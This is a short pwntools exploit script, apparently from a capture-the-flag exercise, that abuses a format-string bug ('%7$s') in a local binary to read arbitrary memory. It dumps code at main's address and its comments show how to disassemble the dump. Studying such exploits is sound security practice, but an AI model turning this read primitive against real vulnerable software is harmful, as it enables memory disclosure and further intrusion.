# read at arbitrary location
from pwn import *
p = process('./test2')


def leak(addr):
    p.sendline(p32(addr)+'A-'+'%7$s' + '-B')
    p.recvuntil('A-')
    flag=p.recvuntil('-B')
    return flag[:-2]
#print hex( u32(p.recv()[-5:][:4]))

flag_addr=0x80485a0
main_addr=0x080484e2

#objdump -D -b binary -mi386 -Maddr32,data32 ./leak.bin
#it works ! <- nearly. The notional load address has to be defined
#otherwise, jumps/calls will point to wrong addrresses
# for example:    0x080484e6 <+43>:	e8 95 fe ff ff	call   0x8048380 <fgets@plt>
# ndisasm -b32 -o80484e2h -a ./leak.bin 
#    0x080484e6 <+43>:	e8 95 fe ff ff	call   0x8048380 <fgets@plt>
# $ ndisasm -b32 -o80484e2h -a ./leak.bin 
# 080484E2  8D45D4            lea eax,[ebp-0x2c]
# 080484E5  50                push eax
# 080484E6  E895FEFFFF        call dword 0x8048380
# 080484EB  83C410            add esp,byte +0x10
# 080484EE  83EC0C            sub esp,byte +0xc
# 080484F1  8D45D4            lea eax,[ebp-0x2c]
# $
# without this -o switch, we would print such a thing:
# 00000004  E895FEFFFF        call dword 0xfffffe9e <- which is not a proper jump to fgets@plt !!



leaked = leak(main_addr) + '\0'
l = open('leak.bin', "wb")
l.write(leaked)
l.close()

